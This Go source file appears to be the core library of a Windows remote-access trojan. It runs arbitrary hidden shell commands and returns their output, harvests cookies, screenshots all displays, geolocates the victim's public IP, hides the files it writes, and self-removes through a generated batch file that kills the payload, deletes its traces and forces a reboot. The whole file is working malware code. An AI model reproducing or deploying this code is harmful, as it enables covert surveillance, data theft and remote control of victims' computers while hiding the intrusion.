package lib

import (
	"fmt"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	conf "payload/config"
	"strconv"
	"strings"
	"syscall"

	"github.com/kbinani/screenshot"
	"github.com/oschwald/geoip2-golang"
)

func (f *FileInf) SelfRemove() {
	f.FileName = conf.START_SERVICE
	rmbatch := "@echo off\r\n" +
		"set \"payload_path=" + conf.PAYLOAD_PATH + conf.NNAME + "\"\r\n" +
		"set \"batch_path=%~f0\"\r\n" +
		"set \"service_path=" + f.Startup() + "\"\r\n" +
		"start /B cmd.exe /C ping -n 1 127.0.0.1 > nul & " +
		"taskkill /IM \"" + conf.NNAME + "\" /F & " +
		"del \"%service_path%\" & del \"%batch_path%\" & del /f /q /a:h \"%payload_path%\"\r\n" +
		"exit"
	f.FileName = conf.REMOVE_SERVICE
	f.FileData = rmbatch
	f.createFile()
	os.Rename(f.Path(false)+"\\"+f.FileName, f.Startup())
	f.RShell("shutdown /r /t 0")
}

func (f *FileInf) RShell(command string) string {
	shell := exec.Command("cmd", "/C", command)
	outshell, err := shell.CombinedOutput()
	if err != nil {
		return string(outshell)
	}

	shell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	oversize := strings.Trim(string(command), " ") + "_" + "shell.txt"

	/*
		9500 charcters is a lenght limit for makrdown.
	*/
	if len(string(outshell)) > 9500 {
		f.FileName = oversize
		f.FileData = string(outshell)
		f.createFile()
		hiddenAttribute(f.Path(false) + "\\" + oversize)
		return "Creating file for oversize characters...\n\n" +
			"File Name: " + oversize + "\n" +
			"File Path: " + f.Path(false) + "\\" + oversize +
			"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
	}
	return string(outshell)
}

func (f *FileInf) Cookies(url string) string {
	cookies := httpReq("GET", url).Cookies()
	for _, cookie := range cookies {
		f.FileData = "cookie: " + cookie.Name + "=" + cookie.Value
		f.createFile()
	}
	hiddenAttribute(f.Path(false) + "\\" + f.FileName)
	return "Cookies Name: " + f.FileName +
		"\nCookies Path: " + f.Path(false) + "\\" + f.FileName +
		"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
}

func (f *FileInf) CaptureScreen() string {
	display := screenshot.NumActiveDisplays()
	for i := 0; i < display; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Panic(err)
		}
		screen, err := os.Create(f.FileName)
		if err != nil {
			log.Panic(err)
		}
		defer screen.Close()
		png.Encode(screen, img)
	}
	hiddenAttribute(f.Path(false) + "\\" + f.FileName)
	return "Image Name: " + f.FileName + "\n" +
		"Image Path: " + f.Path(false) + "\\" + f.FileName +
		"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
}

func (f *FileInf) GeoIP() string {
	body, err := io.ReadAll(httpReq("GET", "https://api.ipify.org").Body)
	if err != nil {
		log.Panic(err)
	}
	db, err := geoip2.Open(f.FileName)
	if err != nil {
		return "MMDB file not founf...\n" +
			"Here is a link to download it: https://www.maxminf.com"
	}
	defer db.Close()

	ip := net.ParseIP(string(body))
	record, err := db.City(ip)
	if err != nil {
		log.Panic(err)
	}

	/*
		Lazy float convert.
	*/
	Cordinates := fmt.Sprintf("%v, %v", record.Location.Latitude, record.Location.Longitude)

	return "Country: " + record.Country.Names["en"] +
		"\nCity: " + record.City.Names["en"] +
		"\nTime Zone: " + record.Location.TimeZone +
		"\nCordinates: " + Cordinates +
		"\nPublic IPv4: " + string(body)
}
